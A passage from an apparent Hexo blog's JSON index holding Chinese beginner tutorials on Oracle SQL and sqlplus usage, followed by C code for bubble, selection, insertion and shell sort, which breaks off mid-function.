12345CASE expr WHEN comparison_expr1 THEN return_expr1 [WHEN comparison_expr2 THEN return_expr2 WHEN comparison_exprn THEN return_exprn ELSE else_expr]END 案例: 老板打算给涨工资，总裁1000，经理800，普通员工400，将涨前、涨后薪水列出 介绍case when 的用法和decode的用法: 使用case when 12345678910111213select empno, ename, job, sal &quot;涨前薪水&quot;, case job when &apos;PRESIDENT&apos; then sal + 1000 when &apos;MANAGER&apos; then sal + 800 else sal + 400 end &quot;涨后薪水&quot; from emp; 使用decode函数: 1234567891011select empno, ename, job, sal &quot;涨前薪水&quot;, decode(job, &apos;PRESIDENT&apos;, sal + 1000, &apos;MANAGER&apos;, sal + 800, sal + 400) &quot;涨后薪水&quot; from emp; 代码优化","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"排序","slug":"排序","date":"2022-05-11T14:35:18.000Z","updated":"2022-05-11T14:40:00.561Z","comments":true,"path":"2022/05/11/排序/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/11/排序/","excerpt":"","text":"使用order by关键字, 基本格式: 12select ... from ... where condition order by colname|alias|expr|number(序号)order by有两种排序方法; 一种是升序, 一种是降序: 默认是升序的(asc), 降序为desc a 使用列名进行排序: 1 员工信息按入职日期先后排序 12select * from emp order by hiredate asc;select * from emp order by hiredate; --asc可以省略不写 2 员工薪水按从大到小排序 1select * from emp order by sal desc; 3 查询员工信息按奖金逆序 1234select * from emp order by comm desc;select * from emp order by comm desc nulls last; 注意: null值表现为无穷大, 可以使用nulls last来使null放在最后 4 员工信息按部门升序、薪水降序排列 1234select * from emp order by deptno, sal desc ;根据排序结果得出结论: asc和desc作用于最近的前面的一列 按照多个列进行排序的时候, 先按照第一列进行排序, 若第一列相同,则按照第二列排序 b 使用序号进行排序:(并说明什么序号) 1 查询员工编号, 员工姓名和工资, 按照序号(工资)进行排序 123 select empno, ename, sal from emp order by 3; 序号: select后面出现的列的次序, 次序从1开始. c 使用别名进行排序 1 按员工的年收入进行排序 1select empno, ename, sal, sal*12+nvl(comm, 0) yearcomm from emp order by yearcomm; d 使用表达式进行排序 1 按照员工的年薪进行排序 1select empno, ename, sal, sal*12 from emp order by sal*12; 关于排序的几点说明: 12341 要了解排序可以使用哪几种方式 列名 序号 别名 表达式2 如果有多列进行排序, 应该如何排序, 可以结合案例理解. 若有多列进行排序, 优先按第1列进行排序, 如果第1列相同,再按照第2列进行排序.","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"单行函数","slug":"单行函数","date":"2022-05-11T14:25:41.000Z","updated":"2022-05-11T14:49:17.466Z","comments":true,"path":"2022/05/11/单行函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/11/单行函数/","excerpt":"","text":"单行函数:只对针对一行进行, 返回一行记录 字符串相关函数: 1 lower 小写, upper 大写, initcap 单词的首字母大写 1select lower(&apos;HELLO WORLD&apos;) &quot;小写&quot;, upper(&apos;Hello world&apos;) &quot;大写&quot;, initcap(&apos;hello world&apos;) &quot;首字母大写&quot; from dual; 2 concat(连接符||) 1234567select concat(&apos;hello &apos;,&apos;world&apos;) from dual; **注意: concat函数只能连接两个字符串, 若想连接三个的话只能嵌套调用: select concat(concat(&apos;hello &apos;,&apos;world&apos;), &apos; nihao&apos;) from dual; select &apos;hello &apos; || &apos;world &apos; || &apos;nihao&apos; from dual; **注意: || 可以连接多个字符串, 建议使用||来连接字符串. **总结: concat只能用于两个字符串的连接, ||可以用于多个字符串的连接, 在使用的使用建议尽量的使用||. 3 substr(str,pos,len)截取字符串 12select substr(&apos;helloworld&apos;,1,3), substr(&apos;helloworld&apos;,1), substr(&apos;helloworld&apos;,-3) from dual; **总结:pos是从1开始的, 若len为0表示从pos开始, 截取到最后, 若pos为负数, 表示从末尾倒数开始截取, 4 instr(str, substr):判断substr是否在str中存在, 若存在返回第一次出现的位置, 若不存在则返回0 1select instr(&apos;hello llo&apos;, &apos;llo&apos;), instr(&apos;hello llo&apos;, &apos;ow&apos;)from dual; 5 lpad和rpad–l®pad(str, len, ch):返回len长度的字符串, 如果str不够len的话, 在左(右)填充ch这个字符 1select lpad(&apos;aaaa&apos;, 10, &apos;$&apos;), rpad(&apos;aaaa&apos;, 10, &apos;#&apos;) from dual; 6 trim:去掉首部和尾部的空格,中间的空格不去掉 123select &apos;aaa&apos;||trim(&apos; hello world &apos;)||&apos;bbb&apos; from dual; trim(c from str):去掉str中的c字符 select trim(&apos;x&apos; from &apos;xxxxxhello worldxxxxx&apos;) from dual; 7 replace(str, old, new):将str字符串中的old字符串替换成new字符串 1select replace(&apos;hello world&apos;,&apos;llo&apos;,&apos;yy&apos;) from dual; 8 length和lengthb 1234select length(&apos;hello world&apos;) 字符数, lengthb(&apos;hello world&apos;) 字节数 from dual;select length(&apos;哈喽我的&apos;) 字符数, lengthb(&apos;哈喽我的&apos;) 字节数 from dual; 注意:对于length函数一个汉字是一个字符, 对于lengthb函数,一个汉字占两个, 这两个函数对于普通字符串没有什么区别. 数值函数 1 round: 四舍五入 1select round(45.926, 2) 一, round(45.926, 1) 二, round(45.926, 0) 三, round(45.926, -1) 四, round(45.926, -2) 五 from dual; trunc: 截取 1select trunc(45.926, 2) 一, trunc(45.926, 1) 二, trunc(45.926, 0) 三, trunc(45.926, -1) 四, trunc(45.926, -2) 五 from dual; 2 mod 1select mod(1600, 300) from dual; 3 ceil:向上取整 floor:向下取整 1select ceil(121/30), floor(121/30) from dual; 转换函数: 1 to_char和to_number 1234--把薪水转换为本地货币字符型select empno,sal,to_char(sal,&apos;L9,999&apos;) from emp;--把上述某个结果转回数值型select to_number(&apos;￥2,975&apos;,&apos;L9,999&apos;) from dual; 2 to_char 与 to_date 1234--显示 &quot;yyyy-mm-dd hh24:mi:ss 今天是 星期几&quot;select to_char(sysdate,&apos;yyyy-mm-dd hh24:mi:ss &quot;今天是&quot; day&apos;) from dual;--将上述输出字符串反转回日期select to_date(&apos;2017-12-04 01:12:48 今天是 星期一&apos;, &apos;yyyy-mm-dd hh24:mi:ss &quot;今天是&quot; day&apos;) from dual; 查询1981-11-17日入职的员工信息: 12select * from emp where to_char(hiredate, &apos;YYYY-MM-DD&apos;)=&apos;1981-11-17&apos;;select * from emp where hiredate = to_date(&apos;1981-11-17&apos;, &apos;YYYY-MM-DD&apos;); oracle的隐式转换和显示转换: 1234567891011select 11+&apos;22&apos; from dual;select 11+to_number(&apos;22&apos;) from dual;对于select 11+&apos;22&apos; from dual; 会做隐式转换, 将&apos;22&apos;转换成22select &apos;11&apos; || 22 from dual;select &apos;11&apos; || to_char(22) from dual;对于select 11+&apos;22&apos; from dual; 会做隐式转换, 将22转换成&apos;22&apos; select 11+&apos;1a&apos; from dual; --报错, 1a不是数字, 所以不能转**总结: 当没有明确转换函数的时候, 如果类型不一致, 会进行隐式转换, 隐式有一个前提, 它必须能转换, 但应尽量避免隐式转换。 时间和日期函数: 显示当前的系统日期 1select sysdate from dual; 显示当前的系统日期显示到秒 1select to_char(sysdate, &apos;yyyy-mm-dd hh24:mi:ss&apos;) from dual; 显示当前日期星期几 1select to_char(sysdate, &apos;day&apos;) from dual; 显示昨天，今天，明天–oracle日期型+1代表加一天 1select sysdate-1 昨天,sysdate 今天,sysdate+1 明天 from dual; 计算员工工龄 可以按日，周，月，年 日期差减方法 1select empno,ename,sysdate-hiredate 日,(sysdate-hiredate)/7 周,(sysdate-hiredate)/30 月,(sysdate-hiredate)/365 年 from emp; 日期函数 months_between add_months last_day next_day 1select empno, ename, months_between(sysdate,hiredate), (sysdate-hiredate)/30 月 from emp; add_months:增加月份 1select add_months(sysdate, 2) from dual; 求明年的今天 1select add_months(sysdate,12) from dual; last_day:最后一天–指定日期所在月份的最后一天 1select last_day(sysdate) from dual; next_day:求指定日期的下一个星期几 1select next_day(sysdate, &apos;星期一&apos;) from dual; round、trunc 对日期型数据进行四舍五入和截断 12select round(sysdate, &apos;month&apos;), round(sysdate, &apos;year&apos;) from dual;select trunc (sysdate, &apos;month&apos;), trunc(sysdate, &apos;year&apos;) from dual; ​","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"in和like","slug":"in和like","date":"2022-05-11T13:16:07.000Z","updated":"2022-05-11T13:19:43.984Z","comments":true,"path":"2022/05/11/in和like/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/11/in和like/","excerpt":"","text":"3 在where条件中使用in–in后面是一个集合 1 查询部门号是10或者20的员工信息 123456select * from emp where deptno=10 or deptno=20;select * from emp where deptno in(10,20);思考: 可以在in的集合中使用null吗? select * from emp where deptno in(10,20,null); select * from emp where deptno=10 or deptno=20 or deptno=null; 2 查询不是10和20号部门的员工信息 12345678select * from emp where deptno!=10 and deptno!=20;select * from emp where deptno not in(10,20); 思考: 若not in的集合中有null会怎么样呢? select * from emp where deptno not in(10,20,null); select * from emp where deptno!=10 and deptno!=20 and deptno!=null; not in后面不能出现null 在where条件中使用like–模糊查找, 其中: '%‘匹配任意多个字符。’_'匹配一个字符 1 查询员工首字母是S的员工信息 1select * from emp where ename like &apos;S%&apos;; 2 查询员工编号为79开头的员工信息 1select * from emp where empno like &apos;79%&apos;; 3 查询名字为四个字母长度的员工信息 1select * from emp where ename like &apos;____&apos;; 4 查询员工姓名带_的员工信息 123456插入一条记录, 用于测试转义字符insert into emp (EMPNO, ENAME, JOB, MGR, HIREDATE, SAL, COMM, DEPTNO)values (1000, &apos;TOM_CAT&apos;, &apos;CLERK&apos;, 9999, to_date(&apos;23-01-1982&apos;, &apos;dd-mm-yyyy&apos;), 1200.00, null, 10); select * from emp where ename like &apos;%\\_%&apos; escape &apos;\\&apos;; ​","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"where逻辑表达式","slug":"where逻辑表达式","date":"2022-05-11T12:57:34.000Z","updated":"2022-05-11T13:01:28.031Z","comments":true,"path":"2022/05/11/where逻辑表达式/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/11/where逻辑表达式/","excerpt":"","text":"在where条件中使用逻辑运算符: or and not 1 查询10号部门或者20部门的员工信息 1select * from emp where deptno=10 or deptno=20; 2 查询10号部门员工工资为1300的员工信息 1select * from emp where deptno=10 and sal=1300; 3 查询81年2月(含2月)至82年2月(不含2月)入职的员工信息(大于等于81年2月1日，小于等于82年1月31日) 123说明: 注意日期格式问题,注意月份单月不要在前面加0,否则会报错 select * from emp where hiredate&gt;=&apos;1-2月-81&apos; and hiredate&lt;=&apos;31-1月-82&apos;; select * from emp where hiredate between &apos;1-2月-81&apos; and &apos;31-1月-82&apos;; 结论: 关于and or 操作符的sql优化问题? 1234where条件在进行逻辑表达式计算的时候,是从右往左进行的, 所以对于and来说, 要把容易出现假的放在最右边, 对于or来说, 要把容易出现真的表达式放在最右边.where a and b and c and d;where a or b or c or d; 4 查询奖金为空的员工信息-null 123select * from emp where comm=null; --不正确的写法select * from emp where comm is null; 5 查询奖金不为空的员工信息 123456select * from emp where comm!=null;select * from emp where comm is not null;结论: 关于null的在where条件中使用的结论? where条件后面为空应该用is null where条件后面不为空使用is not null 分析下面的sql语句: 12345select * from emp where deptno=10 or deptno=30 and sal=1250; **注意: 在有or和and的where条件中, and的优先级比or高, 所以若表示10部门或者20部门, 且sal为1250的, 应该 select * from emp where (deptno=10 or deptno=30) and sal=1250; **结论: 在where条件表达式中有or的时候, 应该使用()括起来","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"select查询-比较运算符","slug":"select查询和比较运算符","date":"2022-05-11T12:38:00.000Z","updated":"2022-05-11T13:01:45.285Z","comments":true,"path":"2022/05/11/select查询和比较运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/11/select查询和比较运算符/","excerpt":"","text":"若在编写sql语句的时候, 书写错误, 则可以进行修改: ​ 123456如 SQL&gt; select * ffom SQL&gt; emp; 先输入: 错误发生的那一行, 然后输入c /ffom/from,最后输入/执行sql语句. SQL&gt; 2 SQL&gt; c/ffom/from SQL&gt; / ​ 若编写的sql语句比较长, 可以使用edit打开一个记事本, 在记事本上编写: 123如: SQL&gt;edit , 然后按/执行sql语句语句末尾不需要加分号最后以/结束 保存查询结果: spool名的使用: spool d:\\results select * from emp; spool off 这样会将查询结果保存到文件中. where 1基本结构: select .... from table where 条件; 使用比较运算符: &gt; &gt;= &lt; &lt;= != (&lt;&gt;) between and 1 查询10号部门的员工信息 1select * from emp where deptno=10; 2 查询员工名字为king的员工信息 123select * from emp where ename = &apos;KING&apos;; 结论: 表中的列的值是区分大小写的; 但是关键字不区分大小写 3 查找薪水不等于1250员工的信息 12select * from emp where sal!=1250;select * from emp where sal&lt;&gt;1250; 4 查询入职日期为1981年11月17日的员工信息 12select * from emp where hiredate=&apos;1981-11-17&apos;; --查询错误select * from emp where hiredate=&apos;17-11月-81&apos;; 查询当前使用的日期格式: 1select * from v$nls_parameters; 修改日期格式: 1alter session set NLS_DATE_FORMAT=&apos;yyyy-mm-dd&apos;; 修改成原有的格式: 12alter session set NLS_DATE_FORMAT=&apos;DD-MON-RR&apos;; 说明: 需要注意日期格式, 默认是DD-MON-RR 5 查找工资介于1000-2000之间的员工信息 1234select * from emp where sal&gt;=1000 and sal&lt;=2000;select * from emp where sal between 1000 and 2000;结论: between and是闭区间","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"SQL和sqlplus区别","slug":"SQL和sqlplus区别","date":"2022-05-11T11:58:46.000Z","updated":"2022-05-11T12:37:35.588Z","comments":true,"path":"2022/05/11/SQL和sqlplus区别/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/11/SQL和sqlplus区别/","excerpt":"","text":"SQL和sqlplus 我们已经学习使用了select，应该知道还有update、delete、insert、create… 同时，我们学习了ed、c、set、col、desc…. SQL → 语言，关键字不能缩写。 sqlplus → Oracle提供的工具，可在里面执行SQL语句，它配有自己的命令(ed、c、set、col) 特点是缩写关键字。 SQL • 一种语言 • ANSI 标准 • 关键字不能缩写 • 使用语句控制数据库中的表的定义信息和表中的数据 SQL*Plus • 一种环境 • Oracle 的特性之一 • 关键字可以缩写 • 命令不能改变数据库中的数据的值 • 集中运行","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"基本的SELECT语句","slug":"基本的SELECT语句","date":"2022-05-11T11:47:23.000Z","updated":"2022-05-11T11:52:14.880Z","comments":true,"path":"2022/05/11/基本的SELECT语句/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/11/基本的SELECT语句/","excerpt":"","text":"SQL语句不区分大小写 基本的SELECT语句 ​ 其语法格式为：SELECT *|{[DISTINCT] column|expression [alias],...} FROM table; 案例: 1 查询所有员工的所有记录 1select * from emp; 2 查询员工号，姓名，月薪，奖金，年薪 123select empno, ename, sal, comm, sal*12 from emp; 使用select * 和 select 列名的区别: 使用select *会先查有哪些列, 影响效率 3 对案例2使用别名: 12345select empno, ename, sal as 工资, comm 奖金, sal*12 &quot;年 薪&quot; from emp;关于别名的结论: as可以省略 如果别名中间有空格, 需要使用&quot;&quot;引起来 4 查询员工号，姓名，月薪，奖金，年薪，年收入 12345select empno, ename, sal, comm, sal*12 年薪, sal*12+nvl(comm, 0) 年收入 from emp;结论: 1 包含有null的表达式都为空 2 nvl的用法: nvl(a, b): 如果a为空, 则取b的值. 5 查看员工表不同的部门编号 1select distinct deptno from emp; 6 查看不同部门的不同工种 select distinct detpno, job from emp; 结论: distinct的作用范围?? distinct作用于后面出现的所有的列. 7 输出计算表达式 3+20*5，显示当前日期 sysdate select 3+20*5, sysdate from dual; 注意: dual表是一个伪表, 主要是为了满足sql的语法规定","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"sqlplus的基本操作","slug":"sqlplus的基本操作","date":"2022-05-11T11:20:29.000Z","updated":"2022-05-11T11:47:10.695Z","comments":true,"path":"2022/05/11/sqlplus的基本操作/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/11/sqlplus的基本操作/","excerpt":"","text":"显示当前用户: 1show user 查看当前用户下的表: 1select * from tab; 查看表结构: 1desc 表名; 设置行宽: 1set linesize 140 设置页面显示的行数: 1set pagesize 100 永久设置行宽和页面显示的行数: 12C:\\app\\Administrator\\product\\11.2.0\\client_1\\sqlplus\\admin\\glogin.sql C:\\app\\Administrator\\product\\11.2.0\\dbhome_1\\sqlplus\\admin\\glogin.sql 设置列宽: 1234a 代表一个字符9 代表一位数字col ename for a10col sal for 9999 命令行删除字符 ctrl +BACKSPACE键","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"启动oracle服务和连接oracle数据库","slug":"启动oracle服务和连接oracle数据库","date":"2022-05-09T13:31:35.000Z","updated":"2022-05-11T10:44:59.986Z","comments":true,"path":"2022/05/09/启动oracle服务和连接oracle数据库/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/09/启动oracle服务和连接oracle数据库/","excerpt":"","text":"windows下的oracle的启动: ​ 启动OracleServiceORCL ​ 启动home1TNSListener ​ 在本机登陆： 普通用户身份登陆 sqlplus ↙ 用户名 ↙ 密码 ↙ sqlplus 用户名/密码，如sqlplus scott/tiger 以管理员身份登陆 sqlplus / as sysdba（此处不用输入密码，在安装的时候已经输入密码） sqlplus sys/sys as sysdba linux下启动oracle数据库: 使用linux的oracle用户登陆: 123456sqlplus sys/sys as sysdbasqlplus / as sysdba SQL&gt; startup ---启动数据库服务SQL&gt; shutdown immeidate ----关闭数据库服务 ​ 启动监听服务: 1lsnrctl start linux下停止oracle数据库: 停止监听服务: 1lsnrctl stop 通过网络使用客户端远程登陆 远程通过网络登陆数据库需要安装oracle客户端软件，并进行配置才能使用，可通过使用net manager进行配置，配置完成之后可以使用连接字符串进行登陆，连接字符串中包含了数据库服务的IP地址和端口，以及实例名。 注意：安装oracle客户端的时候，安装路径中不能出现中文和空格，安装的时候选择管理员模式。 D:\\oracle\\app\\HGUANG\\product\\11.2.0\\client_1\\network\\admin\\tnsnames.ora，下面是经过Net Manager进行配置后得到的一个文件内容： 客户端安装完成之后进行远程登陆之前最好先进行测试： 首先测试网络是否是通的： ping IP， 然后tnsping IP 或者 tnsping oracle_orcl。 使用sqlplus登陆oracle数据库: 1234普通用户登陆: sqlplus scott/tiger@192.168.10.145/orcl sqlplus scott/tiger@orcl/orclsys用户登陆: sqlplus sys/sys as sysdba ​ 解锁用户: 1alter user scott account unlock; 加锁用户: 123alter user scott account lock;需要用sys用户来加锁或者解锁,加锁之后用户就登录不了了 修改用户密码: 123password 用户名或alter user 用户名 identified by xxxxx; 查看当前的语言环境: 1select userenv(&apos;language&apos;) from dual; ​ 查看当前用户 1show user 切换账号 123conn 账号/密码@服务名 as sysdba或conn 账号/密码@服务名 配置net manager 以管理员身份运行net manager PLSQL Developer客户端登录 以管理员身份运行PLSQL Developer 可以选择命令窗口或sql窗口执行语句","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"oracle体系结构","slug":"oracle体系结构","date":"2022-05-09T12:36:53.000Z","updated":"2022-05-09T13:28:27.054Z","comments":true,"path":"2022/05/09/oracle体系结构/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/09/oracle体系结构/","excerpt":"","text":"Oracle的体系结构 Oracle服务器：是一个数据管理系统(RDBMS)，它提供开放的, 全面的, 近乎完整的信息管理。由1个数据库和一个（或多个）实例组成。数据库位于硬盘上，实例位于内存中。 PGA(程序全局区): 处理客户端请求 SGA(系统全局区): 数据提交后SGA的内容会写到磁盘中,提交之后不能回滚,SGA比较吃内存 表空间(users)和数据文件 逻辑概念：表空间，表空间由多个数据文件组成。位于实例上，在内存中。 物理概念：数据文件，位于硬盘之上。(C:\\app\\Administrator\\oradata\\orcl目录内后缀为.DBF的文件) ​ 一个表空间可以包含一个或者是多个数据文件。1：n（表空间：数据文件） 段、区、块 段存在于表空间中； 段是区的集合； 区是数据块的集合； 数据块会被映射到磁盘块。 查看oracle实例服务 12ps -ef | grep 实例名_ps -ef | grep orcl_ UPS不间断电源供电系统 如果一个电源断电了,UPS系统马上启动,并立马供电,所以不会出现断电 如果一个数据库中有多个实例可以起到负载均衡的作用. 比如同时有1万个用户操作数据库,那么实例A可以接收5000个用户,实例B可以接收5000个用户,这样就不会出现一个实例卡死","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"oracle介绍","slug":"oracle介绍","date":"2022-05-09T12:34:45.000Z","updated":"2022-05-09T12:36:21.286Z","comments":true,"path":"2022/05/09/oracle介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/09/oracle介绍/","excerpt":"","text":"数据库介绍 什么是数据库? ​ 数据库是为了实现一定的目的按某种规则组织起来的数据的集合, 简单的说,数据库就是存储数据的库. 数据库是干什么用的? 存储和管理数据,便于程序开发. oracle简介: Oracle是殷墟（yīn Xu）出土的甲骨文（oracle bone inscriptions）的英文翻译的第一个单词。 Oracle公司成立与1977年，总部位于美国加州； Oracle数据库是Oracle（中文名称叫甲骨文）公司的核心产品，Oracle数据库是一个适合于大中型企业的数据库管理系统。在所有的数据库管理系统中（比如：微软的SQL Server，IBM的DB2等），Oracle的主要用户涉及面非常广, 包括: 银行、电信、移动通信、航空、保险、金融、电子商务和跨国公司等。 Oracle数据库的一些版本有：Oracle7、Oracle8i、Oracle9i，Oracle10g到Oracle11g，Oracle12c， 各个版本之间的操作存在一定的差别，但是操作oracle数据库都使用的是标准的SQL语句，因此对于各个版本的差别不大。 2008年1月16日 收购bea，目的是为了得到weblogic（web服务器的框架，免费的对应的tomcat）。 2008年1月16日 sun公司收购了mysql 。 2009年4月20日 oracle收购了sun 。 常见的数据库有哪些？ 1 oracle公司的oracle数据库 2 IBM公司的DB2数据库 3 Informix公司的Informix数据库 4 sysbase公司的sysbase数据库 5 Microsoft公司的SQL Server 6 oracle的MySQL数据库（开始属于mysql公司，后来mysql被sun收购，sun又被oracle收购） 7 MongoDB数据库","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"平衡二叉树与红黑树介绍","slug":"平衡二叉树与红黑树介绍","date":"2022-05-02T16:26:00.000Z","updated":"2022-05-02T16:26:59.082Z","comments":true,"path":"2022/05/03/平衡二叉树与红黑树介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/03/平衡二叉树与红黑树介绍/","excerpt":"","text":"","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"排序算法","slug":"排序算法","date":"2022-04-27T07:10:54.000Z","updated":"2022-04-27T09:49:35.272Z","comments":true,"path":"2022/04/27/排序算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/04/27/排序算法/","excerpt":"","text":"冒泡排序 稳定性 冒泡排序是一种稳定的排序算法 选择排序效率：O（n2) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/********************* 排序规则 *********************冒泡排序算法的运作如下：（从后往前） 1. 比较相邻的元素。如果第一个比第二个大，就交换他们两个。 2. 对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。 3. 针对所有的元素重复以上的步骤，除了最后一个。 4. 持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。稳定性:冒泡排序是一种稳定排序算法***************************************************///冒泡排序(升序)void bubbleSort(int *array, int len) //O(n²)&#123;#if 0 // 外层 for (int i= 0; i &lt; len; ++i) &#123; for (int j = 1; j &lt; len - i; j++) &#123; // 交换 if (array[j] &lt; array[j - 1]) &#123; int tmp = array[j]; array[j] = array[j - 1]; array[j - 1] = tmp; &#125; &#125; &#125;#endif // 0: 没有排好, 1: 已经排好 int flag = 0; for (int i = len - 1; i &gt; 0 &amp;&amp; flag==0; --i) &#123; flag = 1; // 默认已经排好 for (int j = 0; j &lt; i; ++j) &#123; if (array[j] &gt; array[j + 1]) &#123; int tmp = array[j]; array[j] = array[j + 1]; array[j + 1] = tmp; flag = 0; // 没有排好 &#125; &#125; &#125;&#125;#if 0void main()&#123; int i; //定义整型数组 int array[] = &#123; 11, 8, 7, 6, 3 &#125;; //计算数组长度 int len = sizeof(array) / sizeof(int); //遍历数组 printf(\"待排序数组序列: \"); for (i = 0; i &lt; len; ++i) &#123; printf(\"%d\\t\", array[i]); &#125; printf(\"\\n\"); //排序 bubbleSort(array, len); //遍历 printf(\"冒泡排序之后的序列: \"); for (i = 0; i &lt; len; ++i) &#123; printf(\"%d\\t\", array[i]); &#125; printf(\"\\n\"); system(\"pause\");&#125;#endif 选择排序 稳定性 选择排序是不稳定的排序方法 选择排序效率：O（n2) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/*-------------------- 排序规则 -------------------- 它的工作原理是每一次从待排序的数据元素中选出 最小（或最大）的一个元素，存放在序列的起始位 置，直到全部待排序的数据元素排完。 稳定性:选择排序是不稳定的排序方法 如:[5,5,3]-------------------------------------------------*///选择排序(升序排列)void selectionSort(int *array, int len)&#123; int min = 0; // 指向最小的元素的位置 // 外层循环 for (int i = 0; i &lt; len - 1; ++i) &#123; min = i; // 内存循环 for (int j = i + 1; j &lt; len; ++j) &#123; // 判断 if (array[min] &gt; array[j]) &#123; // 保存最小的元素的位置 min = j; &#125; &#125; // 判断是否需要交换 if (min != i) &#123; // 找到了新的最小值 // 交换 int tmp = array[min]; array[min] = array[i]; array[i] = tmp; &#125; &#125;&#125;#if 0void main()&#123; int i; //定义整型数组 int array[] = &#123; 12, 5, 33, 6, 10 &#125;; //计算数组长度 int len = sizeof(array) / sizeof(int); //遍历数组 printf(\"待排序数组序列: \"); for (i = 0; i &lt; len; ++i) &#123; printf(\"%d\\t\", array[i]); &#125; printf(\"\\n\"); //排序 selectionSort(array, len); //遍历 printf(\"选择排序之后的序列: \"); for (i = 0; i &lt; len; ++i) &#123; printf(\"%d\\t\", array[i]); &#125; printf(\"\\n\"); system(\"pause\");&#125;#endif 插入排序 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/******************* 排序规则 ******************* 每次处理就是将无序数列的第一个元素与有序数列 的元素从后往前逐个进行比较，找出插入位置，将 该元素插入到有序数列的合适位置中。 稳定性:插入排序是稳定的***********************************************///插入排序算法(升序排列)void insertionSort(int *array, int len)&#123; int tmp = 0; // 存储基准数 int index = 0; // 坑的位置 // 遍历无序序列 for (int i = 1; i &lt; len; ++i) &#123; index = i; tmp = array[i]; // 遍历有序序列(从后往前) for (int j = i - 1; j &gt;= 0; --j) &#123; // 基准数根有序序列中的元素比较 if (tmp &lt; array[j]) &#123; // 有序序列元素后移 array[j + 1] = array[j]; // 坑的位置 index = j; &#125; else &#123; break; &#125; &#125; // 填坑 array[index] = tmp; &#125;&#125;#if 0void main()&#123; int i; //定义整型数组 int array[] = &#123; 12, 5, 33, 6, 10 &#125;; //计算数组长度 int len = sizeof(array) / sizeof(int); //遍历数组 printf(\"待排序数组序列: \"); for (int i = 0; i &lt; len; ++i) &#123; printf(\"%d\\t\", array[i]); &#125; printf(\"\\n\"); //排序 insertionSort(array, len); //遍历 printf(\"插入排序之后的序列: \"); for (i = 0; i &lt; len; ++i) &#123; printf(\"%d\\t\", array[i]); &#125; printf(\"\\n\"); system(\"pause\");&#125;#endif 稳定性 插入排序是稳定的排序算法 插入排序效率：O(n2) 希尔排序 稳定性 希尔排序是不稳定的排序算法。 希尔排序的效率：O（n*logn）≈ O（1.3*n） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/**************************** 排序规则 **************************** 希尔排序是把记录按下标的一定增量分组，对每组使用直接插入排序算法排序； 随着增量逐渐减少，每组包含的关键词越来越多，当增量减至1时，整个文件恰 被分成一组，算法便终止。 稳定性: 希尔排序是非稳定排序算法。*****************************************************************///希尔排序void shellSort(int *array, int len)&#123; // 步长 int gap = len; while (gap &gt; 1) &#123; // 步长递减公式 gap = gap / 3 + 1; // 分组, 对每一组, 进行插入排序 for (int i = 0; i &lt; gap; ++i) &#123; int tmp; // 基准数 int index; // 坑的位置 // 插入排序 // 无序序列 for (int j = i + gap; j &lt; len; j += gap) &#123; tmp = array[j]; index = j; // 有序序列(从后往前遍历) for (int k = j - gap; k &gt;= 0; k -= gap) &#123; if (tmp &lt; array[k]) &#123; // 后移 array[k + gap] = array[k]; // 位置 index = k; &#125; else &#123; break; &#125; &#125; // 填坑 array[index] = tmp; &#125; &#125; &#125;&#125;#if 1void main()&#123; int i; //定义整型数组 int array[] = &#123; 12, 5, 33, 6, 10 &#125;; //计算数组长度 int len = sizeof(array) / sizeof(int); //遍历数组 printf(\"待排序数组序列: \"); for (int i = 0; i &lt; len; ++i) &#123; printf(\"%d\\t\", array[i]); &#125; printf(\"\\n\"); //排序 shellSort(array, len); //遍历 printf(\"希尔排序之后的序列: \"); for (i = 0; i &lt; len; ++i) &#123; 